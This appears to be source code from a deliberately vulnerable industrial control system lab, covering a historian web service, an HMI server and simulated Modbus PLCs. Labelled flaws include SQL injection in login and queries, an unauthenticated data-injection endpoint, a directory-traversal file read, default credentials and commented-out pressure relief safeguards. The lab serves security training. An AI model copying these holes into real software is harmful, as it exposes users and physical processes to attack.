        conn = sqlite3.connect('historian.db')
        c = conn.cursor()
        query = f"SELECT * FROM historian_users WHERE username='{username}' AND password='{password}'"

        try:
            c.execute(query)
            user = c.fetchone()

            if user:
                session['username'] = user[1]
                session['role'] = user[3]
                conn.close()
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid credentials'
        except Exception as e:
            error = f'Database error: {str(e)}'

        conn.close()

    return render_template('historian_login.html', error=error)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('historian_dashboard.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/api/query', methods=['POST'])
def api_query():
    """VULNERABILITY: SQL Injection in query endpoint"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json() or {}
    plc_id = data.get('plc_id', 'all')
    tag_name = data.get('tag_name', '%')
    hours = data.get('hours', 1)

    # VULNERABILITY: SQL Injection in query
    conn = sqlite3.connect('historian.db')
    c = conn.cursor()

    start_time = (datetime.now() - timedelta(hours=int(hours))).strftime('%Y-%m-%d %H:%M:%S')

    if plc_id == 'all':
        query = f"SELECT * FROM timeseries WHERE tag_name LIKE '{tag_name}' AND timestamp > '{start_time}' ORDER BY timestamp DESC LIMIT 1000"
    else:
        query = f"SELECT * FROM timeseries WHERE plc_id={plc_id} AND tag_name LIKE '{tag_name}' AND timestamp > '{start_time}' ORDER BY timestamp DESC LIMIT 1000"

    try:
        c.execute(query)
        rows = c.fetchall()
        conn.close()

        results = []
        for row in rows:
            results.append({
                'id': row[0],
                'timestamp': row[1],
                'plc_id': row[2],
                'tag_name': row[3],
                'value': row[4],
                'quality': row[5]
            })

        return jsonify({'success': True, 'data': results, 'count': len(results)})
    except Exception as e:
        conn.close()
        return jsonify({'error': str(e)}), 400

@app.route('/api/inject', methods=['POST'])
def api_inject():
    """VULNERABILITY: Time-series injection - allows inserting fake data"""
    # VULNERABILITY: No authentication check
    # if 'username' not in session:
    #     return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json() or {}
    timestamp = data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    plc_id = data.get('plc_id', 1)
    tag_name = data.get('tag_name', '')
    value = data.get('value', 0)
    quality = data.get('quality', 'BAD')

    conn = sqlite3.connect('historian.db')
    c = conn.cursor()
    c.execute("INSERT INTO timeseries (timestamp, plc_id, tag_name, value, quality) VALUES (?, ?, ?, ?, ?)",
              (timestamp, plc_id, tag_name, value, quality))
    conn.commit()
    conn.close()

    return jsonify({
        'success': True,
        'message': 'Data injected',
        'warning': 'No validation performed'
    })

@app.route('/api/trending/<plc_id>/<tag_name>')
def api_trending(plc_id, tag_name):
    """Get trending data for a specific tag"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    hours = request.args.get('hours', 1, type=int)
    start_time = (datetime.now() - timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect('historian.db')
    c = conn.cursor()
    c.execute("SELECT timestamp, value FROM timeseries WHERE plc_id=? AND tag_name=? AND timestamp > ? ORDER BY timestamp ASC",
              (plc_id, tag_name, start_time))
    rows = c.fetchall()
    conn.close()

    timestamps = [row[0] for row in rows]
    values = [row[1] for row in rows]

    return jsonify({
        'timestamps': timestamps,
        'values': values,
        'count': len(rows)
    })

@app.route('/api/tags')
def api_tags():
    """Get all available tags"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('historian.db')
    c = conn.cursor()
    c.execute("SELECT DISTINCT plc_id, tag_name FROM timeseries ORDER BY plc_id, tag_name")
    rows = c.fetchall()
    conn.close()

    tags = {}
    for row in rows:
        plc_id = f"PLC-{row[0]}"
        if plc_id not in tags:
            tags[plc_id] = []
        tags[plc_id].append(row[1])

    return jsonify({'tags': tags})

@app.route('/api/alarms')
def api_alarms():
    """Get recent alarms"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('historian.db')
    c = conn.cursor()
    c.execute("SELECT * FROM alarms ORDER BY timestamp DESC LIMIT 100")
    rows = c.fetchall()
    conn.close()

    alarms = []
    for row in rows:
        alarms.append({
            'id': row[0],
            'timestamp': row[1],
            'plc_id': row[2],
            'alarm_type': row[3],
            'message': row[4],
            'severity': row[5],
            'acknowledged': row[6]
        })

    return jsonify({'alarms': alarms})

@app.route('/api/export', methods=['POST'])
def api_export():
    """VULNERABILITY: Arbitrary file read via export"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    format_type = request.form.get('format', 'csv')
    filename = request.form.get('filename', 'export.csv')

    # VULNERABILITY: Directory traversal
    if format_type == 'custom':
        # Allows reading arbitrary files
        try:
            with open(filename, 'r') as f:
                content = f.read()
            return jsonify({'success': True, 'data': content})
        except Exception as e:
            return jsonify({'error': str(e)}), 400

    return jsonify({'success': True, 'message': 'Export prepared'})

@app.route('/api/stats')
def api_stats():
    """Get statistics about collected data"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = sqlite3.connect('historian.db')
    c = conn.cursor()

    c.execute("SELECT COUNT(*) FROM timeseries")
    total = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM timeseries WHERE plc_id=1")
    plc1 = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM timeseries WHERE plc_id=2")
    plc2 = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM timeseries WHERE plc_id=3")
    plc3 = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM timeseries WHERE plc_id=4")
    plc4 = c.fetchone()[0]

    conn.close()

    return jsonify({
        'total': total,
        'plc1': plc1,
        'plc2': plc2,
        'plc3': plc3,
        'plc4': plc4
    })

# Start data collector thread
collector_thread = threading.Thread(target=data_collector, daemon=True)
collector_thread.start()

if __name__ == '__main__':
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  Historian Service - Time-Series Data Collection          â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Default Credentials:
      historian / data123  (Admin)
      analyst / trend456   (Viewer)
      guest / guest        (Guest)

    Web Interface: http://localhost:8888
    API Endpoint:  http://localhost:8086 (simulated)

    Known Vulnerabilities:
      â€¢ SQL Injection in login
      â€¢ SQL Injection in query endpoint
      â€¢ Time-series data injection (no auth)
      â€¢ Unauthorized data access
      â€¢ Directory traversal in export
      â€¢ No input validation

    WARNING: DO NOT EXPOSE TO INTERNET
    """)

    app.run(host='0.0.0.0', port=8888, debug=True)



================================================================================
FILE: core/hmi_server.py
================================================================================
#!/usr/bin/env python3
"""
HMI (Human-Machine Interface) Server
Visual SCADA interface with P&ID diagrams and real-time process data

Features:
- Live process visualization (tank levels, pressures, temperatures)
- Animated equipment (pumps, valves, compressors)
- Alarm panels with priority indicators
- Trend charts for historical data
- Control buttons for operators
"""

import os
import sys
import time
import logging
from flask import Flask, render_template, jsonify, request
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'hmi-secret-key-change-in-production'

# Initialize shared state
shared_state.init_state()


@app.route('/')
def index():
    """Main HMI dashboard"""
    return render_template('hmi_dashboard.html')


@app.route('/api/process_data')
def get_process_data():
    """Get current process data for all systems"""
    data = {
        'timestamp': time.time(),

        # Tank System (PLC-1)
        'tank': {
            'level': shared_state.get_state('physical_tank_level', 50.0),
            'pump_running': shared_state.get_state('plc1_pump_status', False),
            'valve_position': shared_state.get_state('plc1_valve_position', 50.0),
            'overflow': shared_state.get_state('physical_tank_level', 0) > 95,
            'low_level': shared_state.get_state('physical_tank_level', 0) < 10
        },

        # Pressure System (PLC-2)
        'pressure': {
            'value': shared_state.get_state('physical_pressure', 80.0),
            'compressor_running': shared_state.get_state('plc2_compressor_1_status', False),
            'relief_valve_open': shared_state.get_state('plc2_relief_valve_1', False),
            'high_alarm': shared_state.get_state('physical_pressure', 0) > 120,
            'low_alarm': shared_state.get_state('physical_pressure', 0) < 50
        },

        # Temperature System (PLC-3)
        'temperature': {
            'value': shared_state.get_state('physical_temperature', 20.0),
            'heater_on': shared_state.get_state('plc3_heater_status', False),
            'cooling_on': shared_state.get_state('plc3_cooling_status', True),
            'high_alarm': shared_state.get_state('physical_temperature', 0) > 200,
            'thermal_runaway': False  # TODO: Get from physical process
        },

        # Safety System (PLC-4)
        'safety': {
            'shutdown_active': shared_state.get_state('physical_shutdown', False),
            'alarms': shared_state.get_state('physical_alarms', [])
        }
    }

    return jsonify(data)


@app.route('/api/alarms')
def get_alarms():
    """Get current active alarms"""
    alarms = []

    # Collect alarms from physical process
    physical_alarms = shared_state.get_state('physical_alarms', [])
    for alarm in physical_alarms:
        alarms.append({
            'timestamp': time.time(),
            'system': 'Physical Process',
            'severity': 'CRITICAL' if 'RUPTURE' in alarm or 'DAMAGE' in alarm else 'HIGH',
            'message': alarm
        })

    # Check IDS alerts
    ids_alerts = shared_state.get_state('modbus_ids_alerts', [])
    for alert in ids_alerts[-10:]:  # Last 10 alerts
        alarms.append({
            'timestamp': alert.get('timestamp', ''),
            'system': 'Security IDS',
            'severity': alert.get('severity', 'MEDIUM'),
            'message': f"{alert.get('type', 'UNKNOWN')}: {alert.get('description', '')}"
        })

    return jsonify(alarms)


@app.route('/api/control/<system>/<action>', methods=['POST'])
def control_action(system, action):
    """Execute control action"""
    try:
        if system == 'tank':
            if action == 'start_pump':
                shared_state.update_state('plc1_pump_status', True)
            elif action == 'stop_pump':
                shared_state.update_state('plc1_pump_status', False)
            elif action == 'open_valve':
                shared_state.update_state('plc1_valve_position', 100.0)
            elif action == 'close_valve':
                shared_state.update_state('plc1_valve_position', 0.0)

        elif system == 'pressure':
            if action == 'start_compressor':
                shared_state.update_state('plc2_compressor_1_status', True)
            elif action == 'stop_compressor':
                shared_state.update_state('plc2_compressor_1_status', False)
            elif action == 'open_relief':
                shared_state.update_state('plc2_relief_valve_1', True)
            elif action == 'close_relief':
                shared_state.update_state('plc2_relief_valve_1', False)

        elif system == 'temperature':
            if action == 'heater_on':
                shared_state.update_state('plc3_heater_status', True)
            elif action == 'heater_off':
                shared_state.update_state('plc3_heater_status', False)
            elif action == 'cooling_on':
                shared_state.update_state('plc3_cooling_status', True)
            elif action == 'cooling_off':
                shared_state.update_state('plc3_cooling_status', False)

        return jsonify({'success': True, 'message': f'Action {action} executed'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


if __name__ == '__main__':
    log.info("=== HMI Server Starting ===")
    log.info("Access HMI at: http://localhost:8000")
    app.run(host='0.0.0.0', port=8000, debug=False)



================================================================================
FILE: core/modbus_server2.py
================================================================================
#!/usr/bin/env python3
"""
PLC-2: Pressure Control System - Modbus TCP Server
Port 5503

Simulates a pressure control system with compressors and pressure vessels
INTENTIONALLY VULNERABLE - For security testing only
"""

from pymodbus.server.sync import StartTcpServer
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
from pymodbus.payload import BinaryPayloadDecoder, BinaryPayloadBuilder
from pymodbus.constants import Endian
import threading
import time
import random
import logging
import shared_state

# Configure logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# Initialize shared state
shared_state.init_state()

# PLC-2 State - Pressure Control System
PLC2_STATE = {
    'pressure_vessel_1': 100.0,      # PSI
    'pressure_vessel_2': 100.0,      # PSI
    'compressor_1_status': False,
    'compressor_2_status': False,
    'compressor_1_speed': 50,        # 0-100%
    'compressor_2_speed': 50,        # 0-100%
    'relief_valve_1': False,
    'relief_valve_2': False,
    'pressure_sensor_1': 100.0,
    'pressure_sensor_2': 100.0,
    'emergency_vent': False,
    'high_pressure_alarm_1': False,
    'high_pressure_alarm_2': False,
    'low_pressure_alarm_1': False,
    'low_pressure_alarm_2': False,
}

# Store state in shared storage
def sync_state_to_shared():
    """Sync PLC-2 state to shared storage (calculated values only, not controls)"""
    # Only sync calculated/sensor values, NOT control values
    # Control values are managed by web interface and Modbus writes
    calculated_keys = [
        'pressure_vessel_1', 'pressure_vessel_2',
        'pressure_sensor_1', 'pressure_sensor_2',
        'high_pressure_alarm_1', 'high_pressure_alarm_2',
        'low_pressure_alarm_1', 'low_pressure_alarm_2'
    ]
    for key in calculated_keys:
        if key in PLC2_STATE:
            shared_state.update_state(f'plc2_{key}', PLC2_STATE[key])

def sync_state_from_shared():
    """Load PLC-2 state from shared storage"""
    state = shared_state.load_state()
    for key in PLC2_STATE.keys():
        shared_key = f'plc2_{key}'
        if shared_key in state and state[shared_key] is not None:
            PLC2_STATE[key] = state[shared_key]

# Modbus Register Mapping
# Holding Registers (Read/Write) - Address 0-99
# 0-19:   Pressure Vessel 1 controls
# 20-39:  Pressure Vessel 2 controls
# 40-49:  Compressor controls
# 50-59:  Relief valve controls
# 60-99:  Reserved

# Input Registers (Read-Only) - Address 0-99
# 0-19:   Pressure sensors
# 20-39:  Temperature sensors (not used)
# 40-59:  Status indicators
# 60-99:  Reserved

# Coils (Read/Write) - Address 0-99
# 0:  Compressor 1 status
# 1:  Compressor 2 status
# 2:  Relief valve 1
# 3:  Relief valve 2
# 4:  Emergency vent
# 5-99: Reserved

def process_simulation():
    """Simulate pressure control system behavior"""
    while True:
        try:
            # NOTE: Don't load state from shared - it would overwrite
            # control values set via web interface or Modbus
            # Control values come from register monitor thread only

            # Simulate pressure vessel 1
            if PLC2_STATE['compressor_1_status']:
                # Compressor running increases pressure
                increase = PLC2_STATE['compressor_1_speed'] * 0.1
                PLC2_STATE['pressure_vessel_1'] += increase
            else:
                # Natural pressure leak
                PLC2_STATE['pressure_vessel_1'] -= 0.5

            # Relief valve operation (manual control from web interface)
            # NOTE: Automatic safety override disabled for manual control
            # if PLC2_STATE['pressure_vessel_1'] > 150:
            #     PLC2_STATE['relief_valve_1'] = True

            if PLC2_STATE['relief_valve_1']:
                PLC2_STATE['pressure_vessel_1'] -= 5.0

            # Clamp pressure
            PLC2_STATE['pressure_vessel_1'] = max(0, min(200, PLC2_STATE['pressure_vessel_1']))

            # Simulate pressure vessel 2
            if PLC2_STATE['compressor_2_status']:
                increase = PLC2_STATE['compressor_2_speed'] * 0.1
                PLC2_STATE['pressure_vessel_2'] += increase
            else:
                PLC2_STATE['pressure_vessel_2'] -= 0.5

            # Relief valve 2 - manual control only
            # if PLC2_STATE['pressure_vessel_2'] > 150:
            #     PLC2_STATE['relief_valve_2'] = True

            if PLC2_STATE['relief_valve_2']:
                PLC2_STATE['pressure_vessel_2'] -= 5.0

            PLC2_STATE['pressure_vessel_2'] = max(0, min(200, PLC2_STATE['pressure_vessel_2']))

            # Emergency vent
            if PLC2_STATE['emergency_vent']:
                PLC2_STATE['pressure_vessel_1'] -= 10.0
                PLC2_STATE['pressure_vessel_2'] -= 10.0

            # Update pressure sensors (with small noise)
            PLC2_STATE['pressure_sensor_1'] = PLC2_STATE['pressure_vessel_1'] + random.uniform(-1, 1)
            PLC2_STATE['pressure_sensor_2'] = PLC2_STATE['pressure_vessel_2'] + random.uniform(-1, 1)

            # Alarm conditions
            PLC2_STATE['high_pressure_alarm_1'] = PLC2_STATE['pressure_vessel_1'] > 140
            PLC2_STATE['high_pressure_alarm_2'] = PLC2_STATE['pressure_vessel_2'] > 140
            PLC2_STATE['low_pressure_alarm_1'] = PLC2_STATE['pressure_vessel_1'] < 20
            PLC2_STATE['low_pressure_alarm_2'] = PLC2_STATE['pressure_vessel_2'] < 20

            # Save state to shared storage
            sync_state_to_shared()

            # Update Modbus registers
            update_modbus_registers()

            time.sleep(1)
        except Exception as e:
            log.error(f"Process simulation error: {e}")
            time.sleep(1)

def update_modbus_registers():
    """Update Modbus datastore with current state"""
    try:
        context = server_context[0]

        # Update holding registers
        context.setValues(3, 0, [int(PLC2_STATE['pressure_vessel_1'] * 10)])  # Reg 0: Vessel 1 pressure
        context.setValues(3, 1, [int(PLC2_STATE['compressor_1_speed'])])       # Reg 1: Compressor 1 speed
        context.setValues(3, 20, [int(PLC2_STATE['pressure_vessel_2'] * 10)])  # Reg 20: Vessel 2 pressure
        context.setValues(3, 21, [int(PLC2_STATE['compressor_2_speed'])])      # Reg 21: Compressor 2 speed

        # Update input registers (read-only sensors)
        context.setValues(4, 0, [int(PLC2_STATE['pressure_sensor_1'] * 10)])   # Input 0: Sensor 1
        context.setValues(4, 1, [int(PLC2_STATE['pressure_sensor_2'] * 10)])   # Input 1: Sensor 2
        context.setValues(4, 10, [int(PLC2_STATE['high_pressure_alarm_1'])])   # Input 10: Alarm 1
        context.setValues(4, 11, [int(PLC2_STATE['high_pressure_alarm_2'])])   # Input 11: Alarm 2
        context.setValues(4, 12, [int(PLC2_STATE['low_pressure_alarm_1'])])    # Input 12: Low alarm 1
        context.setValues(4, 13, [int(PLC2_STATE['low_pressure_alarm_2'])])    # Input 13: Low alarm 2

        # Update coils
        context.setValues(1, 0, [PLC2_STATE['compressor_1_status']])
        context.setValues(1, 1, [PLC2_STATE['compressor_2_status']])
        context.setValues(1, 2, [PLC2_STATE['relief_valve_1']])
        context.setValues(1, 3, [PLC2_STATE['relief_valve_2']])
        context.setValues(1, 4, [PLC2_STATE['emergency_vent']])

    except Exception as e:
        log.error(f"Error updating registers: {e}")

def read_modbus_registers():
    """Read Modbus registers and update state ONLY if changed by external write"""
    try:
        context = server_context[0]

        # Read coils - only update if they differ from current state
        # (indicates external Modbus write)
        coils = context.getValues(1, 0, 10)
        if bool(coils[0]) != PLC2_STATE['compressor_1_status']:
            PLC2_STATE['compressor_1_status'] = bool(coils[0])
            log.info(f"External Modbus write: compressor_1_status = {coils[0]}")
        if bool(coils[1]) != PLC2_STATE['compressor_2_status']:
            PLC2_STATE['compressor_2_status'] = bool(coils[1])
            log.info(f"External Modbus write: compressor_2_status = {coils[1]}")
        if bool(coils[2]) != PLC2_STATE['relief_valve_1']:
            PLC2_STATE['relief_valve_1'] = bool(coils[2])
            log.info(f"External Modbus write: relief_valve_1 = {coils[2]}")
        if bool(coils[3]) != PLC2_STATE['relief_valve_2']:
            PLC2_STATE['relief_valve_2'] = bool(coils[3])
            log.info(f"External Modbus write: relief_valve_2 = {coils[3]}")
        if bool(coils[4]) != PLC2_STATE['emergency_vent']:
            PLC2_STATE['emergency_vent'] = bool(coils[4])
            log.info(f"External Modbus write: emergency_vent = {coils[4]}")

        # Read holding registers - only update if changed
        regs = context.getValues(3, 0, 60)
        if regs[1] != PLC2_STATE['compressor_1_speed']:
            PLC2_STATE['compressor_1_speed'] = max(0, min(100, regs[1]))
            log.info(f"External Modbus write: compressor_1_speed = {regs[1]}")
        if regs[21] != PLC2_STATE['compressor_2_speed']:
            PLC2_STATE['compressor_2_speed'] = max(0, min(100, regs[21]))
            log.info(f"External Modbus write: compressor_2_speed = {regs[21]}")

    except Exception as e:
        log.error(f"Error reading registers: {e}")

def register_monitor():
    """Monitor register changes and log them"""
    while True:
        try:
            read_modbus_registers()
            time.sleep(0.5)
        except Exception as e:
            log.error(f"Register monitor error: {e}")
            time.sleep(1)

def shared_state_monitor():
    """Monitor shared state for web interface changes"""
    while True:
        try:
            state = shared_state.load_state()

            # Check control values from web interface
            keys_to_monitor = [
                'compressor_1_status', 'compressor_2_status',
                'compressor_1_speed', 'compressor_2_speed',
                'relief_valve_1', 'relief_valve_2', 'emergency_vent'
            ]

            for key in keys_to_monitor:
                shared_key = f'plc2_{key}'
                if shared_key in state and state[shared_key] is not None:
                    if PLC2_STATE[key] != state[shared_key]:
                        log.info(f"Web interface change: {key} = {state[shared_key]}")
                        PLC2_STATE[key] = state[shared_key]

            time.sleep(0.3)
        except Exception as e:
            log.error(f"State monitor error: {e}")
            time.sleep(1)

# Initialize Modbus datastore
store = ModbusSlaveContext(
    di=ModbusSequentialDataBlock(0, [0]*100),  # Discrete Inputs
    co=ModbusSequentialDataBlock(0, [0]*100),  # Coils
    hr=ModbusSequentialDataBlock(0, [0]*100),  # Holding Registers
    ir=ModbusSequentialDataBlock(0, [0]*100)   # Input Registers
)

server_context = ModbusServerContext(slaves=store, single=True)

# Device identification
identity = ModbusDeviceIdentification()
identity.VendorName = 'VulnPLC'
identity.ProductCode = 'PLC-2'
identity.VendorUrl = 'http://github.com/vulnerable-plc'
identity.ProductName = 'Pressure Control PLC'
identity.ModelName = 'VulnPLC-2000-PSI'
identity.MajorMinorRevision = '1.0.0'

if __name__ == '__main__':
    # Initialize shared state with PLC-2 defaults
    sync_state_to_shared()
    log.info("PLC-2 state initialized in shared storage")

    # Start simulation thread
    sim_thread = threading.Thread(target=process_simulation, daemon=True)
    sim_thread.start()

    # Start register monitor thread
    monitor_thread = threading.Thread(target=register_monitor, daemon=True)
    monitor_thread.start()

    # Start shared state monitor thread
    state_monitor_thread = threading.Thread(target=shared_state_monitor, daemon=True)
    state_monitor_thread.start()

    log.info("=" * 60)
    log.info("PLC-2: Pressure Control System - Modbus Server")
    log.info("=" * 60)
    log.info("Modbus TCP Port: 5503")
    log.info("Function Codes:")
    log.info("  - FC01: Read Coils (Compressor/Valve status)")
    log.info("  - FC03: Read Holding Registers (Control values)")
    log.info("  - FC04: Read Input Registers (Sensor readings)")
    log.info("  - FC05: Write Single Coil")
    log.info("  - FC06: Write Single Register")
    log.info("  - FC15: Write Multiple Coils")
    log.info("  - FC16: Write Multiple Registers")
    log.info("=" * 60)
    log.info("Register Map:")
    log.info("  Holding Registers:")
    log.info("    0: Vessel 1 Pressure (x10)")
    log.info("    1: Compressor 1 Speed (0-100%)")
    log.info("    20: Vessel 2 Pressure (x10)")
    log.info("    21: Compressor 2 Speed (0-100%)")
    log.info("  Input Registers:")
    log.info("    0: Pressure Sensor 1 (x10)")
    log.info("    1: Pressure Sensor 2 (x10)")
    log.info("    10-13: Alarm states")
    log.info("  Coils:")
    log.info("    0: Compressor 1 ON/OFF")
    log.info("    1: Compressor 2 ON/OFF")
    log.info("    2: Relief Valve 1")
    log.info("    3: Relief Valve 2")
    log.info("    4: Emergency Vent")
    log.info("=" * 60)
    log.info("VULNERABILITY NOTE:")
    log.info("  - No authentication required")
    log.info("  - No command validation")
    log.info("  - Vulnerable to replay attacks")
    log.info("  - No rate limiting")
    log.info("=" * 60)

    # Start Modbus server
    try:
        StartTcpServer(server_context, identity=identity, address=("0.0.0.0", 5503))
    except KeyboardInterrupt:
        log.info("Shutting down PLC-2 Modbus server...")
    except Exception as e:
        log.error(f"Server error: {e}")



================================================================================
FILE: core/modbus_server3.py
================================================================================
#!/usr/bin/env python3
"""
PLC-3: Temperature Control System - Modbus TCP Server
Port 5504

Simulates a temperature control system with heaters and coolers
INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Firmware upload bypass, insecure deserialization, race conditions
"""

from pymodbus.server.sync import StartTcpServer
from pymodbus.device import ModbusDeviceIdentification
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext
import threading
import time
import random
import logging
import shared_state

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

shared_state.init_state()

# PLC-3 State - Temperature Control System
PLC3_STATE = {
    'zone1_temp': 25.0,              # Celsius
    'zone2_temp': 25.0,
    'zone3_temp': 25.0,
    'heater1_status': False,
    'heater2_status': False,
    'heater3_status': False,
    'heater1_power': 50,             # 0-100%
    'heater2_power': 50,
    'heater3_power': 50,
    'cooler1_status': False,
    'cooler2_status': False,
    'cooler3_status': False,
    'cooler1_power': 50,
    'cooler2_power': 50,
    'cooler3_power': 50,
    'setpoint1': 25.0,
    'setpoint2': 25.0,
    'setpoint3': 25.0,
    'safety_limit_high': 100.0,
    'safety_limit_low': 0.0,
    'thermal_runaway': False,
}

def sync_state_to_shared():
    """Sync PLC-3 state to shared storage (calculated values only, not controls)"""
    calculated_keys = [
        'zone1_temp', 'zone2_temp', 'zone3_temp',
        'setpoint1', 'setpoint2', 'setpoint3',
        'safety_limit_high', 'safety_limit_low'
    ]
    for key in calculated_keys:
        if key in PLC3_STATE:
            shared_state.update_state(f'plc3_{key}', PLC3_STATE[key])

def sync_state_from_shared():
    state = shared_state.load_state()
    for key in PLC3_STATE.keys():
        shared_key = f'plc3_{key}'
        if shared_key in state and state[shared_key] is not None:
            PLC3_STATE[key] = state[shared_key]

def process_simulation():
    """Simulate temperature control system"""
    while True:
        try:
            # NOTE: Don't load state from shared - it would overwrite
            # control values set via web interface or Modbus
            # Control values come from register monitor thread only

            # Simulate Zone 1
            ambient_loss = (PLC3_STATE['zone1_temp'] - 20) * 0.05
            PLC3_STATE['zone1_temp'] -= ambient_loss

            if PLC3_STATE['heater1_status']:
                PLC3_STATE['zone1_temp'] += PLC3_STATE['heater1_power'] * 0.02
            if PLC3_STATE['cooler1_status']:
                PLC3_STATE['zone1_temp'] -= PLC3_STATE['cooler1_power'] * 0.03

            # Simulate Zone 2
            ambient_loss = (PLC3_STATE['zone2_temp'] - 20) * 0.05
            PLC3_STATE['zone2_temp'] -= ambient_loss

            if PLC3_STATE['heater2_status']:
                PLC3_STATE['zone2_temp'] += PLC3_STATE['heater2_power'] * 0.02
            if PLC3_STATE['cooler2_status']:
                PLC3_STATE['zone2_temp'] -= PLC3_STATE['cooler2_power'] * 0.03

            # Simulate Zone 3
            ambient_loss = (PLC3_STATE['zone3_temp'] - 20) * 0.05
            PLC3_STATE['zone3_temp'] -= ambient_loss

            if PLC3_STATE['heater3_status']:
                PLC3_STATE['zone3_temp'] += PLC3_STATE['heater3_power'] * 0.02
            if PLC3_STATE['cooler3_status']:
                PLC3_STATE['zone3_temp'] -= PLC3_STATE['cooler3_power'] * 0.03

            # VULNERABILITY: Thermal runaway condition (race condition)
            if PLC3_STATE['thermal_runaway']:
                PLC3_STATE['zone1_temp'] += 5.0
                PLC3_STATE['zone2_temp'] += 5.0
                PLC3_STATE['zone3_temp'] += 5.0

            # Safety limits
            PLC3_STATE['zone1_temp'] = max(-50, min(200, PLC3_STATE['zone1_temp']))
            PLC3_STATE['zone2_temp'] = max(-50, min(200, PLC3_STATE['zone2_temp']))
            PLC3_STATE['zone3_temp'] = max(-50, min(200, PLC3_STATE['zone3_temp']))

            sync_state_to_shared()
            update_modbus_registers()

            time.sleep(1)
        except Exception as e:
            log.error(f"Process simulation error: {e}")
            time.sleep(1)

def update_modbus_registers():
    try:
        context = server_context[0]

        # Holding registers - temperatures (x10 for precision)
        context.setValues(3, 0, [int(PLC3_STATE['zone1_temp'] * 10)])
        context.setValues(3, 1, [int(PLC3_STATE['setpoint1'] * 10)])
        context.setValues(3, 2, [int(PLC3_STATE['heater1_power'])])
        context.setValues(3, 3, [int(PLC3_STATE['cooler1_power'])])

        context.setValues(3, 20, [int(PLC3_STATE['zone2_temp'] * 10)])
        context.setValues(3, 21, [int(PLC3_STATE['setpoint2'] * 10)])
        context.setValues(3, 22, [int(PLC3_STATE['heater2_power'])])
        context.setValues(3, 23, [int(PLC3_STATE['cooler2_power'])])

        context.setValues(3, 40, [int(PLC3_STATE['zone3_temp'] * 10)])
        context.setValues(3, 41, [int(PLC3_STATE['setpoint3'] * 10)])
        context.setValues(3, 42, [int(PLC3_STATE['heater3_power'])])
        context.setValues(3, 43, [int(PLC3_STATE['cooler3_power'])])

        # Coils - on/off states
        context.setValues(1, 0, [PLC3_STATE['heater1_status']])
        context.setValues(1, 1, [PLC3_STATE['heater2_status']])
        context.setValues(1, 2, [PLC3_STATE['heater3_status']])
        context.setValues(1, 3, [PLC3_STATE['cooler1_status']])
        context.setValues(1, 4, [PLC3_STATE['cooler2_status']])
        context.setValues(1, 5, [PLC3_STATE['cooler3_status']])
        context.setValues(1, 10, [PLC3_STATE['thermal_runaway']])

    except Exception as e:
        log.error(f"Error updating registers: {e}")

def read_modbus_registers():
    """Read Modbus registers and update state ONLY if changed by external write"""
    try:
        context = server_context[0]

        # Read coils - only update if they differ from current state
        coils = context.getValues(1, 0, 20)
        if bool(coils[0]) != PLC3_STATE['heater1_status']:
            PLC3_STATE['heater1_status'] = bool(coils[0])
            log.info(f"External Modbus write: heater1_status = {coils[0]}")
        if bool(coils[1]) != PLC3_STATE['heater2_status']:
            PLC3_STATE['heater2_status'] = bool(coils[1])
            log.info(f"External Modbus write: heater2_status = {coils[1]}")
        if bool(coils[2]) != PLC3_STATE['heater3_status']:
            PLC3_STATE['heater3_status'] = bool(coils[2])
            log.info(f"External Modbus write: heater3_status = {coils[2]}")
        if bool(coils[3]) != PLC3_STATE['cooler1_status']:
            PLC3_STATE['cooler1_status'] = bool(coils[3])
            log.info(f"External Modbus write: cooler1_status = {coils[3]}")
        if bool(coils[4]) != PLC3_STATE['cooler2_status']:
            PLC3_STATE['cooler2_status'] = bool(coils[4])
            log.info(f"External Modbus write: cooler2_status = {coils[4]}")
        if bool(coils[5]) != PLC3_STATE['cooler3_status']:
            PLC3_STATE['cooler3_status'] = bool(coils[5])
            log.info(f"External Modbus write: cooler3_status = {coils[5]}")
        if bool(coils[10]) != PLC3_STATE['thermal_runaway']:
            PLC3_STATE['thermal_runaway'] = bool(coils[10])
            log.info(f"External Modbus write: thermal_runaway = {coils[10]}")

        # Read holding registers - only update if changed
        regs = context.getValues(3, 0, 60)
